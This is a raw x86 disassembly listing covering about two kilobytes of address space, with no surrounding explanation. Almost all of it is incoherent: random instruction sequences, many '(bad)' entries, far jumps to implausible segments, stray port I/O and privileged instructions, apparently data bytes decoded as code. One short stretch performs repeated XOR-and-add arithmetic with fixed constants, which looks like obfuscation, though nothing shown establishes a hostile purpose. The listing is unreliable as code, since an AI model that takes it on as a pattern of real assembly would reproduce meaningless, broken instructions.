  4101e8:	xchg   BYTE PTR [bx-0x5c],cl
  4101ec:	jge    0x4101c2
  4101ee:	mov    bh,dh
  4101f0:	mov    bl,0xfa
  4101f2:	push   0xffffffef
  4101f4:	rcl    cl,1
  4101f6:	inc    esp
  4101f7:	cmc    
  4101f8:	daa    
  4101f9:	mov    al,0x75
  4101fb:	xchg   DWORD PTR [edi-0x6],ebx
  4101fe:	test   BYTE PTR ds:0x5bc6835b,dh
  410204:	ficom  DWORD PTR [esi]
  410206:	push   0x20
  410208:	fs cmp eax,ebp
  41020b:	mov    ds:0xeb4d2c5a,al
  410210:	lds    edx,FWORD PTR [edx+eax*4+0x39]
  410214:	popf   
  410215:	and    DWORD PTR [edi],ebx
  410217:	jmp    0x410254
  410219:	push   edx
  41021a:	mov    esp,0x2827528e
  41021f:	je     0x410218
  410221:	daa    
  410222:	adc    al,0x12
  410224:	lahf   
  410225:	jl     0x4101a7
  410227:	jg     0x41029a
  410229:	pop    ebp
  41022a:	fisttp QWORD PTR [ebp-0x58]
  41022d:	adc    bl,bh
  41022f:	ret    
  410230:	enter  0xceb5,0xc8
  410234:	add    BYTE PTR [edi+0x55ee3aa5],ah
  41023a:	inc    esi
  41023b:	fistp  QWORD PTR [esp+ecx*4+0x752ee34c]
  410242:	out    dx,eax
  410243:	xchg   esi,eax
  410244:	push   esp
  410245:	rol    BYTE PTR ds:0x4b25e7db,0x29
  41024c:	daa    
  41024d:	mov    eax,ecx
  41024f:	cmp    edi,DWORD PTR [ebx+eax*4]
  410252:	ja     0x4101d4
  410254:	clc    
  410255:	xchg   esp,eax
  410256:	or     eax,0x4381a9e5
  41025b:	mov    dl,0x62
  41025d:	or     ch,BYTE PTR [edx]
  41025f:	jg     0x41025c
  410261:	sub    BYTE PTR [edi],dl
  410263:	pop    eax
  410264:	sub    ch,BYTE PTR [edx+0x42a7ab07]
  41026a:	arpl   WORD PTR [eax+0x74d565ab],si
  410270:	jmp    0x410279
  410272:	sbb    al,0x3d
  410274:	cwde   
  410275:	and    eax,0xefd389fd
  41027a:	test   BYTE PTR [edi+0x37],dh
  41027d:	loope  0x410293
  41027f:	fadd   st(3),st
  410281:	dec    edi
  410282:	inc    ebp
  410283:	xchg   esi,eax
  410284:	lock pusha 
  410286:	outs   dx,DWORD PTR ds:[esi]
  410287:	xor    DWORD PTR [ecx+eiz*8+0x74],ecx
  41028b:	cmp    BYTE PTR [esi],ah
  41028d:	out    0x7e,eax
  41028f:	sahf   
  410290:	push   ecx
  410291:	mov    eax,0xd61541be
  410296:	lods   eax,DWORD PTR ds:[esi]
  410297:	test   al,0x1a
  410299:	rcl    BYTE PTR [edi+0x24],1
  41029c:	popa   
  41029d:	jnp    0x4102ae
  41029f:	mov    bl,0x69
  4102a1:	ds jmp 0xe43f57e9
  4102a7:	repz jle 0x4102a2
  4102aa:	xchg   esp,esp
  4102ac:	dec    esp
  4102ad:	mov    edi,0x4764ad9e
  4102b2:	pop    edx
  4102b3:	adc    eax,0x1b43d0dc
  4102b8:	fcomp  QWORD PTR [eax-0x7]
  4102bb:	(bad)  
  4102bc:	mov    ecx,0x45be12d7
  4102c1:	ret    0x6060
  4102c4:	jo     0x410329
  4102c6:	and    cl,BYTE PTR [ebx+0x2a]
  4102c9:	test   DWORD PTR [edx-0x3],0xc293affa
  4102d0:	and    ebx,DWORD PTR [eax-0x534f19fe]
  4102d6:	jl     0x410331
  4102d8:	(bad)  
  4102d9:	fdivr  DWORD PTR [edi+0x12363e5]
  4102df:	mov    ds:0xdd6d3e1f,al
  4102e4:	loop   0x4102d9
  4102e6:	ds (bad) 
  4102e8:	mov    ds:0xfbb8681d,al
  4102ed:	adc    eax,0x67939833
  4102f2:	mov    eax,ds:0xcaf09429
  4102f7:	sub    eax,0x3379d269
  4102fc:	xor    ebx,DWORD PTR [eax]
  4102fe:	xchg   ebx,eax
  4102ff:	add    eax,0x114c5aaa
  410304:	gs xchg ecx,eax
  410306:	inc    ebx
  410307:	jns    0x410373
  410309:	movhps xmm6,QWORD PTR fs:0xe0278767
  410311:	pop    esp
  410312:	fdivr  DWORD PTR [ebx+0x38]
  410315:	pop    eax
  410316:	fild   DWORD PTR [esi]
  410318:	jb     0x410331
  41031a:	lods   eax,DWORD PTR ds:[esi]
  41031b:	loope  0x410341
  41031d:	jp     0x410397
  41031f:	mov    edi,0xe53e4cfb
  410324:	lahf   
  410325:	packuswb mm0,QWORD PTR [edx-0x31]
  410329:	sub    dh,dh
  41032b:	push   esp
  41032c:	aam    0xd5
  41032e:	shl    bh,1
  410330:	dec    edx
  410331:	cli    
  410332:	lock sub BYTE PTR [esi+0x1606d212],dh
  410339:	mov    dl,0x2
  41033b:	fild   WORD PTR [ebx-0x1a8bc4f3]
  410341:	loopne 0x41038f
  410343:	jge    0x4103b2
  410345:	xchg   esp,eax
  410346:	outs   dx,DWORD PTR ds:[esi]
  410347:	jo     0x4102e6
  410349:	and    DWORD PTR [ebp+0x137fd42d],ecx
  41034f:	adc    eax,0xe9e290b8
  410354:	sahf   
  410355:	fstp   QWORD PTR [eax]
  410357:	or     BYTE PTR [ecx],bh
  410359:	dec    ebp
  41035a:	mov    ds:0x7fb99c5,al
  41035f:	les    esi,FWORD PTR [edi-0x3d]
  410362:	lods   al,BYTE PTR ds:[esi]
  410363:	xchg   edi,eax
  410364:	sbb    eax,ebx
  410366:	xor    DWORD PTR [esi],0xffffffe8
  410369:	leave  
  41036a:	push   eax
  41036b:	imul   eax,DWORD PTR [ebp+0x239a3cec],0x2be7bbf1
  410375:	enter  0xa6ac,0xfd
  410379:	mov    bh,0x14
  41037b:	dec    edx
  41037c:	mov    ebp,0x8528ce90
  410381:	iret   
  410382:	jb     0x4103f7
  410384:	das    
  410385:	push   ebp
  410386:	inc    esp
  410387:	jmp    0xaf6ecbe4
  41038c:	xchg   edx,eax
  41038d:	push   cs
  41038e:	outs   dx,BYTE PTR ds:[esi]
  41038f:	out    dx,al
  410390:	mov    dl,0x80
  410392:	cld    
  410393:	dec    esi
  410394:	cmp    DWORD PTR [ebx+ebx*1+0x11],esp
  410398:	mov    ebp,0x11b3ae14
  41039d:	js     0x410378
  41039f:	inc    edx
  4103a0:	pop    ecx
  4103a1:	mov    eax,0x2a8d39ab
  4103a6:	test   DWORD PTR [ecx],edx
  4103a8:	fsqrt  
  4103aa:	and    cl,bh
  4103ac:	jge    0x410347
  4103ae:	pop    ds
  4103af:	shr    DWORD PTR [edx+esi*1-0x45],cl
  4103b3:	fisubr DWORD PTR cs:[esi+0x22]
  4103b7:	mov    esi,0x6232e608
  4103bc:	adc    eax,0x3f3fad9c
  4103c1:	jp     0x4103e2
  4103c3:	jnp    0x410383
  4103c5:	mov    DWORD PTR [edx+0x5c],esi
  4103c8:	fs or  al,0x2f
  4103cb:	mov    ebx,0x84da2494
  4103d0:	add    esp,DWORD PTR [ebx+eax*2-0x2b]
  4103d4:	mov    ds:0xcafe9138,eax
  4103d9:	int3   
  4103da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103db:	or     DWORD PTR [ebp-0xacc64c8],ebx
  4103e1:	call   0x96a3:0x23892362
  4103e8:	cmp    dh,BYTE PTR [edx-0x59ff03fd]
  4103ee:	pusha  
  4103ef:	mov    al,BYTE PTR [edi+esi*4+0x23]
  4103f3:	jmp    0x235f2acd
  4103f8:	imul   ebp,DWORD PTR [edi+0x21],0x20bda491
  4103ff:	jmp    0x5576:0xed2de054
  410406:	lds    ebx,FWORD PTR [ebx]
  410408:	fisub  DWORD PTR [ebp-0x2fefb0b0]
  41040e:	ins    BYTE PTR es:[edi],dx
  41040f:	data16 ficom DWORD PTR fs:0xcbd0b229
  410417:	ret    
  410418:	push   eax
  410419:	xor    BYTE PTR [ebx+0x4c],ah
  41041c:	mov    ecx,0x9a693123
  410421:	xor    ah,ch
  410423:	mov    WORD PTR [esi],?
  410425:	dec    ecx
  410426:	cmp    eax,0x22f4ff1d
  41042b:	outs   dx,BYTE PTR ds:[esi]
  41042c:	inc    BYTE PTR ds:0x77ed93bb
  410432:	test   DWORD PTR [ebp+edi*1+0x7e],ebx
  410436:	mov    ds:0xf3d6c5bf,al
  41043b:	test   BYTE PTR ds:0x5e4fa26b,dl
  410441:	(bad)  
  410442:	fwait
  410443:	pusha  
  410444:	mov    edi,0xb73934
  410449:	mov    dh,0xf3
  41044b:	retf   
  41044c:	iret   
  41044d:	xor    eax,0x73421b5c
  410452:	js     0x4104b9
  410454:	nop
  410455:	aaa    
  410456:	jb     0x410434
  410458:	arpl   WORD PTR [ebp-0x60d77082],si
  41045e:	pop    ebx
  41045f:	pop    edi
  410460:	int3   
  410461:	pop    ss
  410462:	js     0x41040e
  410464:	xchg   ebp,eax
  410465:	sub    ecx,DWORD PTR [ecx-0x666e7cf9]
  41046b:	fisubr WORD PTR [ebp-0x1ee10371]
  410471:	pop    es
  410472:	outs   dx,BYTE PTR ds:[esi]
  410473:	push   ds
  410474:	cld    
  410475:	push   edi
  410476:	add    ebp,DWORD PTR ds:0xff662ab1
  41047c:	or     esp,eax
  41047e:	fstp   TBYTE PTR [esi+0x486bd279]
  410484:	xchg   edx,eax
  410485:	push   ecx
  410486:	dec    esi
  410487:	sahf   
  410488:	or     eax,0xa66bc801
  41048d:	add    eax,esi
  41048f:	sar    esp,0x35
  410492:	data16 clc 
  410494:	repnz les eax,FWORD PTR [edi]
  410497:	cmc    
  410498:	push   cs
  410499:	sbb    esi,ecx
  41049b:	fsubr  DWORD PTR ds:0xa48f00af
  4104a1:	mov    cl,0x5
  4104a3:	aam    0x65
  4104a5:	jb     0x410444
  4104a7:	mov    eax,0xf2280146
  4104ac:	das    
  4104ad:	arpl   dx,dx
  4104af:	adc    eax,0xf0df7855
  4104b4:	sub    eax,0x1eb4e416
  4104b9:	add    ecx,DWORD PTR [edi+edi*4+0x4cae7d01]
  4104c0:	(bad)  
  4104c1:	mov    eax,ds:0xec29d99e
  4104c6:	je     0x4104d1
  4104c8:	dec    edx
  4104c9:	in     al,dx
  4104ca:	test   al,0x6
  4104cc:	inc    ecx
  4104cd:	mov    edx,DWORD PTR [ebx+0x1cccadff]
  4104d3:	ret    
  4104d4:	stos   DWORD PTR es:[edi],eax
  4104d5:	sub    BYTE PTR [edi-0x6d2e1780],0xc2
  4104dc:	dec    BYTE PTR [esp+edi*8]
  4104df:	push   edi
  4104e0:	sub    esp,DWORD PTR [edi+0x4c5ae9f]
  4104e6:	int    0x42
  4104e8:	xor    bl,BYTE PTR [esi]
  4104ea:	xor    ecx,DWORD PTR ds:0x22fd5688
  4104f0:	adc    al,0xaa
  4104f2:	inc    ch
  4104f4:	jns    0x41056f
  4104f6:	jp     0x41055c
  4104f8:	imul   edi,DWORD PTR [ebp-0x793bda15],0x86a4895e
  410502:	out    dx,al
  410503:	cmp    eax,0xd3ee549d
  410508:	mov    al,ds:0xf8852cb6
  41050d:	pop    esi
  41050e:	test   BYTE PTR [edi+0x7f],al
  410511:	sbb    eax,0x6811c57b
  410516:	push   0x24
  410518:	js     0x410593
  41051a:	ret    0xab7e
  41051d:	inc    esi
  41051e:	fnstenv [edi-0x5c0b4201]
  410524:	mov    dl,0xc3
  410526:	(bad)  
  410527:	fldenv [esi]
  410529:	mov    ds:0xc3c2c72c,al
  41052e:	fidivr DWORD PTR [edi+0x7b]
  410531:	addr16 mov ebx,0xb91d3cc0
  410537:	in     eax,0xbe
  410539:	mov    ecx,0xf2547aa0
  41053e:	add    al,0x26
  410540:	es jecxz 0x4104e6
  410543:	or     al,0x56
  410545:	jmp    0x4104fa
  410547:	stos   DWORD PTR es:[edi],eax
  410548:	mov    BYTE PTR [ecx-0x24536b2d],cl
  41054e:	hlt    
  41054f:	xor    DWORD PTR [ebp-0x79],0x6c
  410553:	mov    ds:0xc3d6ebef,eax
  410558:	repz xor ebx,DWORD PTR [ebp+ecx*8+0x78]
  41055d:	sub    ebp,0x32
  410560:	scas   al,BYTE PTR es:[edi]
  410561:	aad    0x0
  410563:	sar    DWORD PTR [ebx+0x7e4bedc9],1
  410569:	cli    
  41056a:	int3   
  41056b:	inc    edi
  41056c:	test   eax,eax
  41056e:	je     0x411a02
  410574:	mov    DWORD PTR [ebp-0x24],esi
  410577:	jmp    0x41096b
  41057c:	in     eax,0xe6
  41057e:	outs   dx,DWORD PTR ds:[esi]
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	push   ebp
  410589:	push   ebp
  41058a:	push   cs
  41058b:	push   ecx
  41058c:	or     bh,BYTE PTR [edi+0x7d497070]
  410592:	jo     0x410604
  410594:	aam    0x1b
  410596:	mov    eax,ds:0x2e415225
  41059b:	fcom   st(1)
  41059d:	sbb    al,0x2d
  41059f:	push   ebx
  4105a0:	aas    
  4105a1:	mov    cl,0x72
  4105a3:	add    ebx,edx
  4105a5:	add    cl,BYTE PTR [ebp-0x5b]
  4105a8:	cmc    
  4105a9:	in     al,0x62
  4105ab:	(bad)  
  4105ac:	cmp    al,0x17
  4105ae:	push   ss
  4105af:	and    al,dh
  4105b1:	std    
  4105b2:	into   
  4105b3:	mov    ah,0x85
  4105b5:	inc    BYTE PTR [esi-0x4b359bb3]
  4105bb:	sub    eax,0x254bb3d1
  4105c0:	ins    BYTE PTR es:[edi],dx
  4105c1:	inc    ebp
  4105c2:	push   0xffffffbf
  4105c4:	add    al,0x96
  4105c6:	inc    eax
  4105c7:	retf   
  4105c8:	or     DWORD PTR [ecx-0x14],ebp
  4105cb:	mov    bl,BYTE PTR ds:0x2c6454bf
  4105d1:	cli    
  4105d2:	xchg   ecx,eax
  4105d3:	mov    bl,0x23
  4105d5:	ja     0x41057e
  4105d7:	xor    BYTE PTR [ebp+ebx*8+0x562b7c27],0x17
  4105df:	jmp    0x2bd37799
  4105e4:	pop    esi
  4105e5:	ins    BYTE PTR es:[edi],dx
  4105e6:	pop    ds
  4105e7:	shr    DWORD PTR [ebx+0x32],0x5c
  4105eb:	js     0x410618
  4105ed:	dec    eax
  4105ee:	imul   BYTE PTR cs:[ebx]
  4105f1:	out    dx,eax
  4105f2:	xchg   edx,eax
  4105f3:	ret    
  4105f4:	mov    cl,0x17
  4105f6:	pop    es
  4105f7:	pslld  mm2,mm7
  4105fa:	cmp    dl,BYTE PTR [eax]
  4105fc:	or     al,0xaa
  4105fe:	jnp    0x4105bf
  410600:	(bad)  
  410601:	icebp  
  410602:	pop    es
  410603:	or     dl,BYTE PTR [eax+0x3f]
  410606:	test   al,0xdf
  410608:	repnz shl DWORD PTR [edi+0x393c82e4],cl
  41060f:	adc    eax,0x101d78d
  410614:	jns    0x41060c
  410616:	sar    BYTE PTR [edi+0xd],cl
  410619:	mov    DWORD PTR [edx+ebx*2],esi
  41061c:	in     eax,0x27
  41061e:	xor    BYTE PTR [esi-0x7c09e8c7],ah
  410624:	jae    0x4105d8
  410626:	stos   BYTE PTR es:[edi],al
  410627:	cld    
  410628:	sub    DWORD PTR [ebp-0x7fb926f0],ebx
  41062e:	stc    
  41062f:	mov    esp,0x9ce6dc7c
  410634:	call   DWORD PTR [esi+ebx*1+0x59]
  410638:	popa   
  410639:	neg    bl
  41063b:	(bad)  
  41063c:	inc    eax
  41063d:	ins    DWORD PTR es:[edi],dx
  41063e:	test   ah,dh
  410640:	or     DWORD PTR [ebp-0x17],0xd9f54fdb
  410647:	jl     0x410603
  410649:	xchg   ecx,eax
  41064a:	cdq    
  41064b:	nop
  41064c:	aad    0xb7
  41064e:	adc    eax,0x339d2e21
  410653:	out    dx,eax
  410654:	cmp    BYTE PTR [edx+0x456cdd4c],dl
  41065a:	cs jmp 0xec59:0x3e3cf2f
  410662:	or     al,0x9b
  410664:	and    BYTE PTR [ebp-0x74],dl
  410667:	shr    edx,1
  410669:	mov    eax,ds:0x8513cb4f
  41066e:	push   esi
  41066f:	inc    ebp
  410670:	rol    DWORD PTR [ebx],cl
  410672:	addr16 dec eax
  410674:	fs xchg ecx,eax
  410676:	test   ebx,0x8a9a5b1a
  41067c:	xchg   ebx,eax
  41067d:	sub    BYTE PTR ss:[eax+0x75],dl
  410681:	cwde   
  410682:	add    edx,ebp
  410684:	sbb    al,0x70
  410686:	or     eax,0x51417b90
  41068b:	fldenv [edx-0xe]
  41068e:	sbb    eax,0x305b5259
  410693:	or     DWORD PTR [ebp-0x4],eax
  410696:	addr16 mov esp,0x8108151e
  41069c:	call   0xddae:0x86fd3f4d
  4106a3:	mov    ch,0x20
  4106a5:	pop    ds
  4106a6:	jae    0x4106c2
  4106a8:	das    
  4106a9:	loope  0x410637
  4106ab:	pop    ecx
  4106ac:	inc    edx
  4106ad:	stos   BYTE PTR es:[edi],al
  4106ae:	xchg   esp,eax
  4106af:	xchg   edx,eax
  4106b0:	test   BYTE PTR [edx+esi*4],cl
  4106b3:	imul   esp,ebp,0xfffffff3
  4106b6:	jp     0x41067b
  4106b8:	xor    ch,BYTE PTR [eax+0x99ee502]
  4106be:	icebp  
  4106bf:	xchg   BYTE PTR [ebx+eax*4-0x13d62906],cl
  4106c6:	dec    edi
  4106c7:	loopne 0x4106db
  4106c9:	and    al,0x75
  4106cb:	ret    
  4106cc:	cli    
  4106cd:	(bad)  
  4106ce:	adc    eax,DWORD PTR [edi]
  4106d0:	(bad)  
  4106d1:	icebp  
  4106d2:	pop    edi
  4106d3:	loopne 0x41068c
  4106d5:	dec    esp
  4106d6:	xor    eax,0xc3f252ff
  4106db:	mov    cl,0xff
  4106dd:	sbb    al,0x4e
  4106df:	jp     0x410749
  4106e1:	call   FWORD PTR [ecx+0x7b70dfad]
  4106e7:	add    al,0xba
  4106e9:	sti    
  4106ea:	jmp    0x30f3:0x68d5
  4106f0:	cmp    eax,0x8ec8aeb8
  4106f5:	fwait
  4106f6:	push   cs
  4106f7:	enter  0xf312,0x95
  4106fb:	shl    edi,0xcf
  4106fe:	or     eax,0xe74fb8fd
  410703:	cmp    bl,ch
  410705:	mov    ebp,0xa2bc543d
  41070a:	out    0x75,eax
  41070c:	(bad)  
  41070d:	lahf   
  41070e:	and    dl,BYTE PTR [ebx-0x3ef01e4c]
  410714:	dec    ebp
  410715:	fimul  DWORD PTR [esi]
  410717:	jno    0x41076d
  410719:	sahf   
  41071a:	pop    ebx
  41071b:	jle    0x41077d
  41071d:	xchg   ecx,eax
  41071e:	rol    DWORD PTR [edi],cl
  410720:	das    
  410721:	xor    BYTE PTR [ebp+0x7d350a8e],dh
  410727:	pop    edi
  410728:	xchg   edx,eax
  410729:	jge    0x4107a9
  41072b:	xchg   esi,eax
  41072c:	mov    esp,0x85f95cb3
  410731:	cwde   
  410732:	lods   eax,DWORD PTR ds:[esi]
  410733:	es loopne 0x4106d3
  410736:	jmp    edx
  410738:	test   ax,0x43fd
  41073c:	cdq    
  41073d:	and    eax,0x269f6a59
  410742:	mov    esp,0x9208c58c
  410747:	mov    al,ds:0x6d73f8dc
  41074c:	or     eax,0x61f67510
  410751:	sahf   
  410752:	lock mov ds:0x75c1a96f,eax
  410758:	xor    ebx,ebp
  41075a:	mov    DWORD PTR [esi+0x72864bb],esi
  410760:	les    esp,FWORD PTR [edi]
  410762:	ins    DWORD PTR es:[edi],dx
  410763:	cmp    eax,0x6b39ffd5
  410768:	sub    al,0x3a
  41076a:	adc    eax,0x2e25a16f
  41076f:	inc    esi
  410770:	push   cs
  410771:	mov    esi,0xa91683dc
  410776:	outs   dx,DWORD PTR ds:[esi]
  410777:	dec    ecx
  410778:	das    
  410779:	inc    edi
  41077a:	lea    eax,ds:0xd59e2b1b
  410780:	pop    ss
  410781:	adc    edi,ecx
  410783:	xchg   ebp,eax
  410784:	push   ebx
  410785:	mov    ds:0xc39043c5,eax
  41078a:	pop    ebp
  41078b:	(bad)  [edx]
  41078d:	loop   0x410746
  41078f:	lock cdq 
  410791:	repnz aaa 
  410793:	pop    esi
  410795:	pop    ds
  410796:	mov    eax,0xf04fcbdf
  41079b:	cld    
  41079c:	or     BYTE PTR [edi],al
  41079e:	xchg   BYTE PTR [ebp+0x4e],bh
  4107a1:	pop    eax
  4107a2:	pop    esp
  4107a3:	push   cs
  4107a4:	(bad)  
  4107a5:	xchg   DWORD PTR [esp+edi*8-0x43],edx
  4107a9:	mov    edi,0xcef64d6d
  4107ae:	push   eax
  4107af:	mov    bl,0x26
  4107b1:	(bad)  
  4107b2:	sbb    DWORD PTR [ebx+0x504f5bb8],edi
  4107b8:	jbe    0x410768
  4107ba:	and    al,0x73
  4107bc:	jnp    0x4107ff
  4107be:	fimul  DWORD PTR [ebp+ecx*2-0x6a]
  4107c2:	les    eax,FWORD PTR [ecx+0x42]
  4107c5:	test   dl,bh
  4107c7:	xlat   BYTE PTR ds:[ebx]
  4107c8:	rcr    BYTE PTR [edi-0x2396c47e],cl
  4107ce:	adc    BYTE PTR [ecx+ebp*1+0x33ccc747],ah
  4107d5:	mov    dl,0x75
  4107d7:	push   ebx
  4107d8:	iret   
  4107d9:	aas    
  4107da:	cmp    bl,ch
  4107dc:	loop   0x410858
  4107de:	mov    edi,0xc1175cd1
  4107e3:	lds    edx,FWORD PTR [ecx]
  4107e5:	ins    DWORD PTR es:[edi],dx
  4107e6:	int3   
  4107e7:	pop    ss
  4107e8:	test   eax,0x3a9beb4
  4107ed:	pop    es
  4107ee:	pushf  
  4107ef:	sbb    eax,0x9f13552f
  4107f4:	cdq    
  4107f5:	js     0x4107c8
  4107f7:	dec    eax
  4107f8:	fsubr  st,st(7)
  4107fa:	clc    
  4107fb:	ret    0x575c
  4107fe:	test   eax,0x21bf245a
  410803:	loope  0x41081c
  410805:	jmp    0x60b6fa26
  41080a:	sub    DWORD PTR [ecx+0x78],esi
  41080d:	jl     0x410865
  41080f:	inc    edx
  410810:	mov    eax,0x451f5328
  410815:	mov    ebp,ecx
  410817:	das    
  410818:	(bad)
  41081d:	ret    
  41081e:	push   ebp
  41081f:	push   ds
  410820:	cmc    
  410821:	sbb    al,0x4f
  410823:	and    BYTE PTR [eax+eiz*1-0x5c],0xb3
  410828:	xor    al,0xfa
  41082a:	or     esi,DWORD PTR [eax+0x57037bb9]
  410830:	jo     0x410812
  410832:	test   DWORD PTR [edx+edx*1-0x137b0365],edi
  410839:	cld    
  41083a:	jge    0x410886
  41083c:	shr    WORD PTR [ebp+0x53],0x6f
  410841:	lea    ebx,[edi+0x79]
  410844:	mov    BYTE PTR cs:[ebp+0x22],bh
  410848:	ds push 0x7fc189b8
  41084e:	popa   
  41084f:	cs push cs
  410851:	cli    
  410852:	sbb    esp,DWORD PTR [esi-0x13]
  410855:	fldenv ds:0xe2394b41
  41085b:	dec    ebp
  41085c:	sbb    BYTE PTR [edi*1-0x10cc2152],0xd6
  410864:	xor    ebp,DWORD PTR [edi-0x73]
  410867:	mov    dl,0x7d
  410869:	add    BYTE PTR [edx],0x87
  41086c:	mov    WORD PTR [ebx],?
  41086e:	mov    esp,0xa60b3686
  410873:	inc    edi
  410874:	fcmovnb st,st(3)
  410876:	pop    esi
  410877:	out    0xc5,al
  410879:	test   al,0x56
  41087b:	dec    edi
  41087c:	out    dx,eax
  41087d:	cmp    ah,cl
  41087f:	cmp    al,0xc7
  410881:	xor    edi,DWORD PTR [ebx-0x5f87e8c5]
  410887:	test   ch,dl
  410889:	or     al,0x43
  41088b:	mov    ebp,0xb3023a44
  410890:	sub    BYTE PTR [ebx],bl
  410892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410893:	in     eax,0x5
  410895:	inc    esi
  410896:	imul   ebp,edx,0xffffff9a
  410899:	jbe    0x41090c
  41089b:	aam    0x3e
  41089d:	and    al,0xf0
  41089f:	inc    edi
  4108a0:	xor    edi,DWORD PTR [ebx+0x11]
  4108a3:	xor    eax,0x2ab1ecb0
  4108a8:	sub    cl,BYTE PTR [edx+0x3fcbadc6]
  4108ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108af:	fist   WORD PTR [ebx-0xb]
  4108b2:	lahf   
  4108b3:	les    ebx,FWORD PTR [eax+0x785498b5]
  4108b9:	xchg   edi,eax
  4108ba:	fild   DWORD PTR [eax]
  4108bc:	test   eax,0x533cfa12
  4108c1:	xor    BYTE PTR [esi+ebx*2+0x69],0x17
  4108c6:	jbe    0x4108f5
  4108c8:	sbb    eax,0xf48ab72c
  4108cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ce:	les    edx,FWORD PTR [esi]
  4108d0:	push   esp
  4108d1:	jne    0x410929
  4108d3:	xlat   BYTE PTR ds:[ebx]
  4108d4:	ror    BYTE PTR [ebx],cl
  4108d6:	or     eax,0x862ad273
  4108db:	pusha  
  4108dc:	xchg   ah,bh
  4108de:	cmp    ah,ah
  4108e0:	pop    edi
  4108e1:	mov    ecx,0xa6c78faf
  4108e6:	leave  
  4108e7:	mov    edx,0x35c83d83
  4108ec:	daa    
  4108ed:	push   ecx
  4108ee:	inc    edi
  4108ef:	fidiv  DWORD PTR [ebx+0x69]
  4108f2:	pushf  
  4108f3:	ret    0x2457
  4108f6:	out    dx,eax
  4108f7:	cmp    ch,BYTE PTR [ebx]
  4108f9:	test   BYTE PTR [ecx+0x31dec8d9],0x3b
  410900:	mov    ch,0x34
  410902:	jbe    0x4108a8
  410904:	lods   al,BYTE PTR ds:[esi]
  410905:	mov    cl,0x15
  410907:	mov    eax,DWORD PTR [ecx-0x7c]
  41090a:	jmp    0x41093a
  41090c:	lods   al,BYTE PTR ds:[esi]
  41090d:	sub    DWORD PTR [ecx+0x5],esp
  410910:	pop    eax
  410911:	sbb    cl,dh
  410913:	arpl   WORD PTR [ebx+0x5817295e],sp
  410919:	(bad)  
  41091a:	mov    dl,0x8c
  41091c:	test   ch,dl
  41091e:	inc    ecx
  41091f:	jmp    0x7a40:0x14d4a186
  410926:	and    BYTE PTR [eax+0x1072a140],dh
  41092c:	xor    edx,esi
  41092e:	mov    ch,0x8
  410930:	jno    0x4108d5
  410932:	fidiv  WORD PTR [ebp-0x23]
  410935:	lods   eax,DWORD PTR ds:[esi]
  410936:	dec    ebx
  410937:	inc    edx
  410938:	ins    BYTE PTR es:[edi],dx
  410939:	jl     0x410920
  41093b:	or     al,0x7f
  41093d:	mov    ah,0x39
  41093f:	(bad)  
  410940:	es dec edx
  410942:	ins    BYTE PTR es:[edi],dx
  410943:	repz jns 0x410925
  410946:	xchg   ebp,eax
  410947:	xchg   edx,eax
  410948:	mov    ah,0xc9
  41094a:	sub    eax,0xcd3f0cc0
  41094f:	cmp    dh,ch
  410951:	xchg   ebx,eax
  410952:	out    0x58,eax
  410954:	xchg   ebp,eax
  410955:	arpl   dx,bx
  410957:	(bad)  
  410958:	mov    dh,0x51
  41095a:	pop    ss
  41095b:	cdq    
  41095c:	lahf   
  41095d:	jp     0x410938
  41095f:	cmp    ah,BYTE PTR [eax]
  410961:	cld    
  410962:	pop    ebx
  410963:	jg     0x410997
  410965:	jg     0x41096e
  410967:	jae    0x4108f9
  410969:	repnz and eax,0x6a590b6a
  41096f:	add    eax,0xcb875b49
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	repz sbb eax,0xbc635108
  410a0a:	jo     0x410a7c
  410a0c:	dec    ecx
  410a0d:	jge    0x410a7f
  410a0f:	jo     0x410a0c
  410a11:	dec    ecx
  410a12:	ss ins BYTE PTR es:[edi],dx
  410a14:	dec    ebp
  410a15:	into   
  410a16:	jmp    0xcdd9:0xc6678445
  410a1d:	sbb    al,BYTE PTR [ebp+0xb2d3243]
  410a23:	pop    eax
  410a24:	int    0x9d
  410a26:	or     esp,ebp
  410a28:	shl    DWORD PTR [ecx+ecx*2+0x66812311],0x6d
  410a30:	lods   eax,DWORD PTR ds:[esi]
  410a31:	dec    esp
  410a32:	jmp    0x410aa0
